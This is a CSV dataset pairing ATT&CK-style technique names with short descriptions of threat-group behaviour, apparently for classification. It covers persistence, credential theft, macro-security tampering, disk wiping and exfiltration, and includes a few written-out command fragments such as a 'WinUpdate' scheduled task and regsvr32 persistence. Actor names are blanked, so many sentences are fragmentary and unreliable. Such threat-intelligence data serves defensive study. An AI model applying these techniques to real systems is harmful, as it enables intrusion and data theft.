name,description,label 
Commonly Used Port,has used ports 53 80 443 and 8080 for C2.,relationship
Scheduled Task,malware has created scheduled tasks to establish persistence.,relationship
Obfuscated Files or Information,has used fragmented strings environment variables standard input (stdin) and native character-replacement functionalities to obfuscate commands.,relationship
Screen Capture,captured screenshots and desktop video recordings.,relationship
Registry Run Keys / Startup Folder,malware has created Registry Run and RunOnce keys to establish persistence and has also added items to the Startup folder.,relationship
User Activity Based Checks,used images embedded into document lures that only activate the payload when a user double clicks to avoid sandboxes.,relationship
Windows Command Shell,used the command prompt to launch commands on the victims machine. ,relationship
Visual Basic,used VBS scripts to help perform tasks on the victim's machine.,relationship
Non-Standard Port,has used port-protocol mismatches on ports such as 53 80 443 and 8080 during C2.,relationship
JavaScript/JScript,used JavaScript scripts to help perform tasks on the victim's machine.,relationship
Malware,has developed malware for use in operations including the creation of infected removable media.,relationship
Obfuscated Files or Information,has used environment variables and standard input (stdin) to obfuscate command-line arguments.  also obfuscates malicious macros delivered as payloads.,relationship
Spearphishing Attachment,has distributed targeted emails containing Word documents with embedded malicious macros.,relationship
Commonly Used Port,has tunneled RDP backdoors over port 443.,relationship
Valid Accounts,has utilized  during and  and .,relationship
Archive via Utility,has used RAR to compress collected data before .,relationship
Ingress Tool Transfer,has used remote code execution to download subsequent payloads.,relationship
Malicious File,has leveraged Spearphishing Attachments attempting to gain User Execution.,relationship
Windows Command Shell,has used a Batch file to automate frequently executed post compromise cleanup activities.  executes commands remotely via cmd.exe.,relationship
Remote Desktop Protocol,has used RDP for .,relationship
File Deletion,has deleted tmp and prefetch files during post compromise cleanup activities.,relationship
Clear Windows Event Logs,has cleared logs during post compromise cleanup activities.,relationship
Windows Management Instrumentation,malicious spearphishing payloads use WMI to launch malware and spawn cmd.exe execution.  has also used WMIC during and post compromise cleanup activities.,relationship
LSASS Memory,harvests credentials using Invoke-Mimikatz or Windows Credentials Editor (WCE).,relationship
Remote System Discovery,uses  and other Active Directory utilities to enumerate hosts.,relationship
Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol,has used FTP to exfiltrate collected data.,relationship
Scheduled Task,has used scheduled tasks to maintain RDP backdoors.,relationship
Asymmetric Cryptography,has used the Plink utility to tunnel RDP back to C2 infrastructure.,relationship
SMB/Windows Admin Shares,has attempted to map to C$ on enumerated hosts to test the scope of their current credentials/context.,relationship
Exploitation for Privilege Escalation,has exploited the CVE-2016-0167 local vulnerability.,relationship
PowerShell,malicious spearphishing payloads are executed as .  has also used  during  and .,relationship
Remote Data Staging,aggregates staged data from a network into a single location.,relationship
Security Software Discovery,has used Registry keys to detect and avoid executing in potential sandboxes.,relationship
Modify Registry,has deleted Registry keys during post compromise cleanup activities.,relationship
Spearphishing Link,has distributed targeted emails containing links to malicious documents with embedded macros.,relationship
Malicious Link,has leveraged Spearphishing Links attempting to gain User Execution.,relationship
Spearphishing Attachment,has used spearphishing emails to send trojanized Microsoft Word documents. ,relationship
PowerShell,has used PowerShell to run a series of base64-encoded commands that acted as a stager and enumerated hosts.,relationship
Windows Command Shell,has run a command script to set up persistence as a scheduled task named WinUpdate as well as other encoded commands from the command-line.,relationship
Malicious File,has used trojanized Microsoft Word documents sent via email which prompted the victim to enable macros.,relationship
Exploitation for Client Execution,has used CVE-2017-11882 to execute code on the victim's machine.,relationship
Scheduled Task,has established persistence through a scheduled task using the command: /Create /F /SC DAILY /ST 09:00 /TN WinUpdate /TR named WinUpdate.,relationship
Template Injection,has used trojanized documents that retrieve remote templates from an adversary-controlled website.,relationship
Visual Basic,has used Word documents that prompts the victim to enable macros and run a Visual Basic script.,relationship
Obfuscated Files or Information,has run encoded commands from the command line.,relationship
MSBuild,has used MSbuild to execute an actor-created file.,relationship
Windows Management Instrumentation,has used WMI queries to check if various security applications were running as well as the operating system version.,relationship
System Checks,has used WMI queries to check if various security applications were running including VMWare and Virtualbox.,relationship
Security Software Discovery,has used WMI queries to detect if virtualization environments or analysis tools were running on the system.,relationship
OS Credential Dumping,has harvested credentials from the victim's machine using .,relationship
System Network Configuration Discovery,has enumerated hosts looking for the public IP address of the system.,relationship
Ingress Tool Transfer,has uploaded and downloaded files to utilize additional plugins.,relationship
Exfiltration Over C2 Channel,has collected information via  which is automatically sent the data back to the adversary's C2.,relationship
Automated Exfiltration,has collected information via  which is automatically sent the data back to the adversary's C2.,relationship
Process Discovery,has enumerated hosts looking to obtain a list of all currently running processes.,relationship
System Information Discovery,has enumerated hosts looking for the system's machine name.,relationship
Symmetric Cryptography,has communicated with a C2 via an encrypted RC4 byte stream and AES-CBC.,relationship
System Owner/User Discovery,has enumerated hosts gathering username machine name and administrative permissions information.,relationship
Data from Local System,has enumerated hosts via  gathering various local system information.,relationship
Automated Collection,has enumerated hosts via  gathering the username domain name machine name and other system information.,relationship
Deobfuscate/Decode Files or Information,has deobfuscated base64-encoded commands following the execution of a malicious script which revealed a small script designed to obtain an additional payload. ,relationship
External Remote Services,has used publicly-accessible RDP and remote management and monitoring (RMM) servers to gain access to victim machines.,relationship
Trusted Relationship,has breached Managed Service Providers (MSP's) to deliver malware to MSP customers.,relationship
Exploit Public-Facing Application,has exploited Oracle WebLogic vulnerabilities for initial compromise.,relationship
Phishing,has conducted malicious spam (malspam) campaigns to gain access to victim's machines.,relationship
Compromise Software Supply Chain,has distributed ransomware by backdooring software installers via a strategic web compromise of the site hosting Italian WinRAR.,relationship
Exfiltration Over C2 Channel,A  file stealer can transfer collected files to a hardcoded C2 server.,relationship
System Information Discovery,A  file stealer can gather the victim's computer name and drive serial numbers to send to a C2 server.,relationship
Web Protocols,A  file stealer can communicate over HTTP for C2.,relationship
Peripheral Device Discovery,tools have contained an application to check performance of USB flash drives.  has also used malware to scan for removable drives.,relationship
Ingress Tool Transfer,Tools used by  are capable of downloading and executing additional payloads.,relationship
System Owner/User Discovery,A  file stealer can gather the victim's username to send to a C2 server.,relationship
Data from Removable Media,A  file stealer has the capability to steal data from newly connected logical volumes on a system including USB drives.,relationship
Windows Command Shell,has used various batch scripts to establish C2 and download additional files. 's backdoor malware has also been written to a batch file.,relationship
File Deletion,tools can delete files used during an infection.,relationship
Registry Run Keys / Startup Folder,tools have registered Run keys in the registry to give malicious VBS files persistence.,relationship
Deobfuscate/Decode Files or Information,tools decrypted additional payloads from the C2.  has also decoded base64-encoded source code of a downloader.,relationship
Visual Basic,has embedded malicious macros in document templates which executed VBScript.  has also delivered Microsoft Outlook VBA projects with embedded macros.,relationship
Template Injection,has used DOCX files to download malicious DOT document templates.  can also inject malicious macros or remote templates into documents already present on compromised systems.,relationship
Malicious File,has attempted to get users to click on Office attachments with malicious macros embedded.,relationship
Spearphishing Attachment,has delivered spearphishing emails with malicious attachments to targets.,relationship
Screen Capture,malware can take screenshots of the compromised computer every minute.,relationship
Data from Local System,has collected files from infected systems and uploaded them to a C2 server.,relationship
Component Object Model,malware can insert malicious macros into documents using a Microsoft.Office.Interop object.,relationship
Web Service,has used GitHub repositories for downloaders which will be obtained by the group's .NET executable on the compromised system.,relationship
Scheduled Task,has created a scheduled task to launch an executable every 10 minutes.,relationship
Compile After Delivery,has compiled the source code for a downloader directly on the infected system using the built-in Microsoft.CSharp.CSharpCodeProvider class.,relationship
Binary Padding,has obfuscated .NET executables by inserting junk code.,relationship
File and Directory Discovery,macros can scan for Microsoft Word and Excel files to inject with additional malicious macros.  has also used its backdoors to automatically list interesting files (such as Office documents) found on a system.,relationship
Disable or Modify Tools,has delivered macros which can tamper with Microsoft Office security settings.,relationship
Internal Spearphishing,has used an Outlook VBA module on infected systems to send phishing emails with malicious attachments to other employees within the organization.,relationship
Modify Registry,has removed security settings for VBA macro execution by changing registry values HKCU\Software\Microsoft\Office\&lt;version&gt;\&lt;product&gt;\Security\VBAWarnings and HKCU\Software\Microsoft\Office\&lt;version&gt;\&lt;product&gt;\Security\AccessVBOM.,relationship
Obfuscated Files or Information,has delivered self-extracting 7z archive files within malicious document attachments and used obfuscated or encrypted scripts.,relationship
Office Application Startup,has inserted malicious macros into existing documents providing persistence when they are reopened.  has loaded the group's previously delivered VBA project by relaunching Microsoft Outlook with the /altvba option once the Application.Startup event is received.,relationship
Native API,malware has used CreateProcess to launch additional malicious components.,relationship
Automated Exfiltration,has used modules that automatically upload gathered documents to the C2 server.,relationship
Automated Collection,has deployed scripts on compromised systems that automatically scan for interesting documents.,relationship
Data from Network Shared Drive,malware has collected Microsoft Office documents from mapped network drives.,relationship
Rundll32,malware has used rundll32 to launch additional malicious components.,relationship
Taint Shared Content,has injected malicious macros into all Word and Excel documents on mapped network drives.,relationship
Spearphishing Attachment,sent emails to victims with malicious Microsoft Office documents attached.,relationship
Disable or Modify Tools,malware can attempt to disable security features in Microsoft Office and Windows Defender using the taskkill command.,relationship
Portable Executable Injection,malware can download a remote access tool  and inject into another process.,relationship
Shortcut Modification,malware can create a .lnk file and add a Registry Run key to establish persistence.,relationship
Windows Command Shell,malware can use cmd.exe to download and execute payloads and to execute commands on the system.,relationship
Native API,malware can leverage the Windows API call CreateProcessA() for execution.,relationship
Ingress Tool Transfer,malware can download additional files from C2 servers.,relationship
Uncommonly Used Port,has used a variant of  that communicates with its C2 server over port 6666.,relationship
Malicious File,attempted to get users to launch malicious Microsoft Office attachments delivered via spearphishing emails.,relationship
Deobfuscate/Decode Files or Information,malware can decode contents from a payload that was Base64 encoded and write the contents to a file.,relationship
Process Hollowing,malware can use process hollowing to inject one of its trojans into another process.,relationship
Registry Run Keys / Startup Folder,malware can create a .lnk file and add a Registry Run key to establish persistence.,relationship
PowerShell,malware can use PowerShell commands to download and execute a payload and open a decoy document on the victims machine.,relationship
Modify Registry,malware can deactivate security mechanisms in Microsoft Office by editing several keys and values under HKCU\Software\Microsoft\Office\.,relationship
Visual Basic,has used macros in s as well as executed VBScripts on victim machines.,relationship
Hidden Window,has used -W Hidden to conceal  windows by setting the WindowStyle parameter to hidden. ,relationship
Uncommonly Used Port,C2 servers communicated with malware over TCP 8081 8282 and 8083.,relationship
File Deletion,Malware used by  is capable of remotely deleting files from victims.,relationship
Screen Capture,Malware used by  is capable of watching the victim's screen.,relationship
Obfuscated Files or Information,disguised its malicious binaries with several layers of obfuscation including encrypting the files.,relationship
Keylogging,Malware used by  is capable of capturing keystrokes.,relationship
Bypass User Account Control,uses a combination of NTWDBLIB.dll and cliconfg.exe to bypass UAC protections using DLL hijacking.,relationship
AppCert DLLs,service-based DLL implant can execute a downloaded file with parameters specified using CreateProcessAsUser.,relationship
File Deletion,removes batch files to reduce fingerprint on the system as well as deletes the CAB file that gets encoded upon infection.,relationship
Archive Collected Data,adds collected files to a temp.zip file saved in the %temp% folder then base64 encodes it and uploads it to control server.,relationship
Process Discovery,gathers a list of processes using the tasklist command and then is sent back to the control server.,relationship
System Information Discovery,gathers computer name and information using the systeminfo command.,relationship
Windows Service,has batch files that modify the system service COMSysApp to load a malicious DLL.,relationship
Local Data Staging,adds collected files to a temp.zip file saved in the %temp% folder then base64 encodes it and uploads it to control server.,relationship
File and Directory Discovery,service-based DLL implant traverses the FTP servers directories looking for files with keyword matches for computer names or certain keywords.,relationship
Deobfuscate/Decode Files or Information,drops a Word file containing a Base64-encoded file in it that is read decoded and dropped to the disk by the macro.,relationship
Obfuscated Files or Information,drops files with base64-encoded data.,relationship
Registry Run Keys / Startup Folder,uses a batch file that configures the ComSysApp service to autostart in order to establish persistence.,relationship
Modify Registry,uses a batch file that modifies Registry keys to launch a DLL into the svchost.exe process.,relationship
Process Injection,uses a batch file to load a DLL into the svchost.exe process.,relationship
Data from Local System,collects data from the local victim system.,relationship
Code Signing,uses a dropper called MaoCheng that harvests a stolen digital signature from Adobe Systems.,relationship
Service Execution,launches a DLL file that gets executed as a service using svchost.exe,relationship
File Transfer Protocols,uses FTP for command and control.,relationship
Automated Exfiltration,performs data exfiltration is accomplished through the following command-line command: from <COMPUTER-NAME> (<Month>-<Day> <Hour>-<Minute>-<Second>).txt.,relationship
Visual Basic,embeds a Visual Basic script within a malicious Word document as part of initial access; the script is executed when the Word document is opened.,relationship
Windows Command Shell,Several commands are supported by the 's implant via the command-line interface and theres also a utility to execute any custom command on an infected endpoint.  used batch scripting.,relationship
Spearphishing Attachment,has used weaponized documents attached to spearphishing emails for reconnaissance and initial compromise.,relationship
System Information Discovery,has used a reconnaissance module to gather information about the operating system and hardware on the infected host.,relationship
Process Discovery,has used a reconnaissance module to identify active processes and other associated loaded modules.,relationship
Web Service,has incorporated at least five different cloud service providers into their C2 infrastructure including CloudMe.,relationship
Regsvr32,has ensured persistence at system boot by setting the value regsvr32 %path%\ctfmonrn.dll /s.,relationship
Domain Groups,has used specific malware modules to gather domain membership.,relationship
Symmetric Cryptography,has encrypted network communications with AES.,relationship
Registry Run Keys / Startup Folder,has maintained persistence by modifying Registry run key value  HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\.,relationship
Multi-hop Proxy,used chains of compromised routers to proxy C2 communications between them and cloud service providers.,relationship
Malicious File,lured victims into clicking malicious files for machine reconnaissance and to execute malware.,relationship
Credentials from Web Browsers,used a browser plugin to steal passwords and sessions from Internet Explorer Chrome Opera Firefox Torch and Yandex.,relationship
Web Protocols,has used HTTP HTTPS and WebDav in network communications.,relationship
Exploitation for Client Execution,has exploited CVE-2012-0158 CVE-2014-1761 CVE-2017-11882 and CVE-2018-0802 for execution.,relationship
File and Directory Discovery,used a file listing plugin to collect information about file and directories both on local and remote drives.,relationship
Obfuscated Files or Information,has encrypted malware payloads dropped on victim machines with AES and RC4 encryption.,relationship
Template Injection,has used decoy documents to load malicious remote payloads via HTTP.,relationship
Visual Basic,has used VBScript to execute malicious commands and payloads.,relationship
PowerShell,has used PowerShell to execute malicious commands and payloads.,relationship
Data from Local System,used a file hunting plugin to collect .txt .pdf .xls or .doc files from the infected host.,relationship
Mshta,has used malicious HTA files to drop and execute malware.,relationship
Software Discovery,has enumerated installed software on compromised systems.,relationship
Data from Local System,gathered information and files from local directories for exfiltration.,relationship
System Service Discovery,performs service discovery using net start commands.,relationship
Archive via Utility,is known to use RAR with passwords to encrypt data prior to exfiltration.,relationship
System Information Discovery,performs operating system information discovery using systeminfo.,relationship
Domain Groups,performs discovery of permission groups net group /domain.,relationship
Domain Account,performs account discovery using commands such as net localgroup administrators and net group REDACTED /domain on specific permissions groups.,relationship
Remote Email Collection,used a .NET tool to dump data from Microsoft Exchange mailboxes.,relationship
Remote System Discovery,has used network scanning and enumeration tools including .,relationship
System Network Configuration Discovery,performs local network configuration discovery using ipconfig.,relationship
LSASS Memory,has dumped credentials including by using .,relationship
Command and Scripting Interpreter,Malware used by  can run commands on the command-line interface.,relationship
Golden Ticket,has used  to generate Kerberos golden tickets.,relationship
SMB/Windows Admin Shares,actors have been known to copy files to the network shares of other computers to move laterally.,relationship
File and Directory Discovery,uses command-line interaction to search files and directories.,relationship
Windows Service,backdoor RoyalDNS established persistence through adding a service called Nwsapagent.,relationship
External Remote Services,regained access after eviction via the corporate VPN solution with a stolen VPN certificate which they had extracted from a compromised host.,relationship
Sharepoint,used a SharePoint enumeration and data dumping tool known as spwebmember.,relationship
Registry Run Keys / Startup Folder,Several  backdoors achieved persistence by adding a Run key.,relationship
Process Discovery,performs process discovery using tasklist commands.,relationship
Exfiltration Over C2 Channel,transferred compressed and encrypted RAR files containing exfiltration through the established backdoor command and control channel during operations.,relationship
System Network Connections Discovery,performs local network connection discovery using netstat.,relationship
Windows Command Shell,has used batch scripts in its malware to install persistence mechanisms.,relationship
Web Protocols,malware RoyalCli and BS2005 have communicated over HTTP with the C2 server through Internet Explorer (IE) by using the COM interface IWebBrowser2.,relationship
Keylogging,has used keyloggers.,relationship
Archive Collected Data,The  group has been known to compress data before exfiltration.,relationship
Service Execution,has used a tool known as RemoteExec (similar to ) to remotely execute batch scripts and binaries.,relationship
Right-to-Left Override,has used the right-to-left override character in spearphishing attachment names to trick targets into executing .scr and .exe files.,relationship
DNS,malware RoyalDNS has used DNS for C2.,relationship
Local Account,performs account discovery using commands such as net localgroup administrators and net group REDACTED /domain on specific permissions groups.,relationship
Security Account Manager,has dumped credentials including by using gsecdump.,relationship
LSA Secrets,has dumped credentials including by using gsecdump.,relationship
Create Process with Token,keylogger KiloAlfa obtains user tokens from interactive sessions to execute itself with API call CreateProcessAsUserA under that user's context.,relationship
Account Manipulation,malware WhiskeyDelta-Two contains a function that attempts to rename the administrators account.,relationship
Drive-by Compromise,delivered  to victims via a compromised legitimate website.,relationship
Hidden Files and Directories,has used a VBA Macro to set its file attributes to System and Hidden and has named files with a dot prefix to hide them from the Finder application.,relationship
Dynamic-link Library Injection,A  malware sample performs reflective DLL injection.,relationship
Compiled HTML File,has used CHM files to move concealed payloads.,relationship
Bootkit,malware WhiskeyAlfa-Three modifies sector 0 of the Master Boot Record (MBR) to ensure that the malware will persist even if a victim machine shuts down.,relationship
Remote Desktop Protocol,malware SierraCharlie uses RDP for propagation.,relationship
File Deletion,malware deletes files in various ways including suicide scripts to delete malware binaries from the victim.  also uses secure file deletion to delete files from the victim. ,relationship
Registry Run Keys / Startup Folder,malware attempts to maintain persistence by saving itself in the Start menu folder or by adding a Registry Run key.,relationship
Spearphishing Attachment,has targeted victims with spearphishing emails containing malicious Microsoft Word documents.,relationship
Local Data Staging,malware IndiaIndia saves information gathered about the victim to a file that is saved in the %TEMP% directory then compressed encrypted and uploaded to a C2 server.,relationship
Standard Encoding,A  malware sample encodes data with base64.,relationship
Keylogging,malware KiloAlfa contains keylogging functionality.,relationship
Commonly Used Port,Some  malware uses a list of ordered port numbers to choose a port for C2 traffic which includes commonly used ports such as 443 53 80 25 and 8080.,relationship
Exfiltration Over C2 Channel,malware IndiaIndia saves information gathered about the victim to a file that is uploaded to one of its 10 C2 servers. Another  malware sample also performs exfiltration over the C2 channel.,relationship
Obfuscated Files or Information,malware uses multiple types of encryption and encoding in its malware files including AES Caracachs RC4 basic XOR with constant 0xA7 and other techniques.,relationship
File and Directory Discovery,Several  malware samples use a common function to identify target files by their extension.  malware families can also enumerate files and directories including a Destover-like variant that lists files and gathers information for all drives.,relationship
System Owner/User Discovery,Various  malware enumerates logged-on users.,relationship
Disable or Modify Tools,malware TangoDelta attempts to terminate various processes associated with McAfee. Additionally  malware SHARPKNOT disables the Microsoft Windows System Event Notification and Alerter services.. During a 2019 intrusion  disabled Windows Defender and Credential Guard as some of their first actions on host. ,relationship
Timestomp,Several  malware families use timestomping including modifying the last write timestamp of a specified Registry key to a random date as well as copying the timestamp for legitimate .exe files (such as calc.exe or mspaint.exe) to its dropped files.,relationship
Web Protocols,malware has conducted C2 over HTTP and HTTPS.,relationship
System Time Discovery,A Destover-like implant used by  can obtain the current system time and send it to the C2 server.,relationship
Data from Local System,malware IndiaIndia saves information gathered about the victim to a file that is uploaded to one of its 10 C2 servers.  malware RomeoDelta copies specified directories from the victim's machine then archives and encrypts the directories before uploading to its C2 server.  has used wevtutil to export Window security event logs. ,relationship
Shortcut Modification,A  malware sample adds persistence on the system by creating a shortcut in the users Startup folder.,relationship
Application Window Discovery,malware IndiaIndia obtains and sends to its C2 server the title of the window for each running process. The KilaAlfa keylogger also reports the title of the window in the foreground.,relationship
LSASS Memory,leveraged  to extract Windows Credentials of currently logged-in users and steals passwords stored in browsers.  has also used a custom version  to capture credentials. ,relationship
Exploitation for Client Execution,has exploited Adobe Flash vulnerability CVE-2018-4878 for execution.,relationship
System Network Configuration Discovery,malware IndiaIndia obtains and sends to its C2 server information about the first network interface cards configuration including IP address gateways subnet mask DHCP information and whether WINS is available.,relationship
Windows Service,Several  malware families install themselves as new services on victims.,relationship
Query Registry,malware IndiaIndia checks Registry keys within HKCU and HKLM to determine if certain applications are present including SecureCRT Terminal Services RealVNC TightVNC UltraVNC Radmin mRemote TeamViewer FileZilla pcAnyware and Remote Desktop. Another  malware sample checks for the presence of the following Registry key:HKEY_CURRENT_USER\Software\Bitcoin\Bitcoin-Qt.,relationship
Windows Management Instrumentation,malware SierraAlfa uses the Windows Management Instrumentation Command-line application wmic to start itself on a target system during lateral movement.,relationship
Process Discovery,Several  malware families gather a list of running processes on a victim system and send it to their C2 server. A Destover-like variant used by  also gathers process times.,relationship
Ingress Tool Transfer,Several  malware families are capable of downloading and executing binaries from its C2 server.,relationship
Archive Collected Data,malware RomeoDelta archives specified directories in .zip format encrypts the .zip file and uploads it to its C2 server. ,relationship
External Proxy,uses multiple proxies to obfuscate network traffic from victims.,relationship
SMB/Windows Admin Shares,malware SierraAlfa accesses the ADMIN$ share via SMB to conduct lateral movement.,relationship
Fallback Channels,malware SierraAlfa sends data to one of the hard-coded C2 servers chosen at random and if the transmission fails chooses a new C2 server to attempt the transmission again.,relationship
Password Spraying,malware attempts to connect to Windows shares for lateral movement by using a generated list of usernames which center around permutations of the username Administrator and weak passwords.,relationship
Malicious File,has attempted to get users to launch a malicious Microsoft Word attachment delivered via a spearphishing email.,relationship
Uncommonly Used Port,Some  malware uses a list of ordered port numbers to choose a port for C2 traffic which includes uncommonly used ports such as 995 1816 465 1521 3306 and many others.,relationship
Multiband Communication,Some  malware uses multiple channels for C2 such as RomeoWhiskey-Two which consists of a RAT channel that parses data in datagram form and a Proxy channel that forms virtual point-to-point sessions.,relationship
Archive via Library,malware IndiaIndia saves information gathered about the victim to a file that is compressed with Zlib encrypted and uploaded to a C2 server.,relationship
Symmetric Cryptography,Several  malware families encrypt C2 traffic using custom code that uses XOR with an ADD operation and XOR with a SUB operation. Another  malware sample XORs C2 traffic. Other  malware uses Caracachs encryption to encrypt C2 payloads.,relationship
System Information Discovery,Several  malware families collect information on the type and version of the victim OS as well as the victim computer name and CPU information. A Destover-like variant used by  also collects disk space information and sends it to its C2 server..,relationship
Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol,malware SierraBravo-Two generates an email message via SMTP containing information about newly infected victims.,relationship
Service Stop,has stopped the MSExchangeIS service to render Exchange contents inaccessible to users.,relationship
Disk Structure Wipe,malware SHARPKNOT overwrites and deletes the Master Boot Record (MBR) on the victim's machine and has possessed MBR wiper malware since at least 2009.,relationship
Disk Content Wipe,has used malware like WhiskeyAlfa to overwrite the first 64MB of every drive with a mix of static and random buffers. A similar process is then used to wipe content in logical drives and finally attempt to wipe every byte of every sector on every drive. WhiskeyBravo can be used to overwrite the first 4.9MB of physical drives. WhiskeyDelta can overwrite the first 132MB or 1.5MB of each drive with random data from heap memory.,relationship
Data Destruction,has used a custom secure delete function to overwrite file contents with data from heap memory.,relationship
Resource Hijacking,has subset groups like Bluenoroff who have used cryptocurrency mining software on victim machines.,relationship
System Shutdown/Reboot,has rebooted systems after destroying files and wiping the MBR on infected systems.,relationship
Windows Command Shell,malware uses cmd.exe to execute commands on victims. A Destover-like variant used by  uses a batch file mechanism to delete its binaries from the system.,relationship
Protocol Impersonation,malware also uses a unique form of communication encryption known as FakeTLS that mimics TLS but uses a different encryption method evading SSL man-in-the-middle decryption attacks.,relationship
Disable or Modify System Firewall,Various  malware modifies the Windows firewall to allow incoming connections or disable it entirely using . ,relationship
Internal Defacement,replaced the background wallpaper of systems with a threatening image after rendering the system unbootable with a ,relationship
Archive via Custom Method,A  malware sample encrypts data using a simple byte based XOR operation prior to exfiltration.,relationship
Non-Standard Port,Some  malware uses a list of ordered port numbers to choose a port for C2 traffic creating port-protocol mismatches.,relationship
Spearphishing via Service,has used fake job advertisements sent via LinkedIn to spearphish victims. ,relationship
Security Support Provider,has rebooted victim machines to establish persistence by installing a SSP DLL.,relationship
Modify Registry,has modified registry keys using the reg windows utility for its custom backdoor implants.,relationship
Masquerade Task or Service,A  custom backdoor implant included a custom PE loader named Security Package that was added into the lsass.exe process via registry key. ,relationship
Software Packing,has used Themida to pack at least two separate backdoor implants.,relationship
Visual Basic,has used VBScript to gather information about a victim machine. ,relationship
PowerShell,has used Powershell to download malicious payloads.,relationship
Mshta,has used mshta.exe to run malicious scripts and download programs.,relationship
Network Service Scanning,scanned network services to search for vulnerabilities in the victim system.,relationship
Password Spraying,used a tool called Total SMB BruteForcer to perform internal password spraying.,relationship
LSASS Memory,used several tools for retrieving login and password information including LaZagne and Mimikatz.,relationship
Local Account,used a tool called Imecab to set up a persistent remote access account on the victim machine.,relationship
File and Directory Discovery,used a tool called MailSniper to search for files on the desktop and another utility called Sobolsoft to extract attachments from EML files.,relationship
Drive-by Compromise,has infected victims using watering holes.,relationship
Obfuscated Files or Information,obfuscated scripts that were used on victim machines.,relationship
Remote Email Collection,used a tool called MailSniper to search through the Exchange server mailboxes for keywords.,relationship
JavaScript/JScript,infected victims using JavaScript code.,relationship
Remote System Discovery,used Microsofts Sysinternals tools to gather detailed information about remote systems.,relationship
Process Doppelgänging,has used  to evade security software while deploying tools on compromised systems.,relationship
Credentials In Files,used several tools for retrieving login and password information including LaZagne.,relationship
LSA Secrets,used several tools for retrieving login and password information including LaZagne.,relationship
Cached Domain Credentials,used several tools for retrieving login and password information including LaZagne.,relationship
Credentials from Password Stores,used several tools for retrieving login and password information including LaZagne.,relationship
Credentials from Web Browsers,used several tools for retrieving login and password information including LaZagne.,relationship
Windows Command Shell,uses a backdoor known as BADFLICK that is is capable of generating a reverse shell and has used multiple types of scripting for execution including JavaScript and JavaScript Scriptlets in XML..,relationship
BITS Jobs,has used  to download additional tools.,relationship
Regsvr32,has used regsvr32 for execution.,relationship
Visual Basic,has used VBScript.,relationship
Deobfuscate/Decode Files or Information,has used a DLL known as SeDll to decrypt and execute other JavaScript backdoors.,relationship
Exploitation for Client Execution,has exploited multiple Microsoft Office and .NET vulnerabilities for execution including CVE-2017-0199 CVE-2017-8759 and CVE-2017-11882.,relationship
Obfuscated Files or Information,has obfuscated code using base64 and gzip compression.,relationship
Local Data Staging,has used C:\Windows\Debug and C:\Perflogs as staging directories.,relationship
PowerShell,has used PowerShell for execution.,relationship
Valid Accounts,has used valid compromised email accounts for defense evasion including to send malicious emails to other victim organizations.,relationship
Registry Run Keys / Startup Folder,has used JavaScript to create a shortcut file in the Startup folder that points to its main backdoor.,relationship
Ingress Tool Transfer,has downloaded additional scripts and files from adversary-controlled servers.,relationship
Windows Management Instrumentation,has used WMI for execution.,relationship
Shortcut Modification,has used JavaScript to create a shortcut file in the Startup folder that points to its main backdoor.,relationship
One-Way Communication,has received C2 instructions from user profiles created on legitimate websites such as Github and TechNet.,relationship
Windows Management Instrumentation Event Subscription,has used WMI for persistence.,relationship
Spearphishing Attachment,has sent spearphishing emails with malicious attachments including .rtf .doc and .xls files.,relationship
Spearphishing Link,has sent spearphishing emails with links often using a fraudulent lookalike domain and stolen branding.,relationship
Binary Padding,has inserted garbage characters into code presumably to avoid anti-virus detection.,relationship
Malicious File,has sent spearphishing attachments attempting to get a user to click.,relationship
Code Signing,has used stolen code signing certificates to sign malware.,relationship
SSH,used ssh for internal reconnaissance.,relationship
OS Credential Dumping,has used publicly available tools to dump password hashes including . ,relationship
Remote Desktop Protocol,has targeted RDP credentials and used it to move through the victim environment. ,relationship
Web Shell,relies on web shells for an initial foothold as well as persistence into the victim's systems. ,relationship
Exfiltration to Cloud Storage,has used an uploader known as LUNCHMONEY that can exfiltrate files to Dropbox.,relationship
Malicious Link,has sent spearphishing email links attempting to get a user to click.,relationship
LSASS Memory,has used publicly available tools to dump password hashes including ProcDump and WCE. ,relationship
Spearphishing Attachment,has delivered spearphishing emails that contain a zipped file with malicious contents.,relationship
Spearphishing Link,has sent phishing emails that contain a link to an external server with ZIP and RAR archives.,relationship
Python,used multiple compiled Python scripts on the victims system.,relationship
Obfuscated Files or Information,employed some visual obfuscation techniques by naming variables as combinations of letters to hinder analysis.,relationship
File Transfer Protocols,malware used FTP for C2.,relationship
Registry Run Keys / Startup Folder,used the startup folder for persistence.,relationship
Local Data Staging,created their own directories to drop files into.,relationship
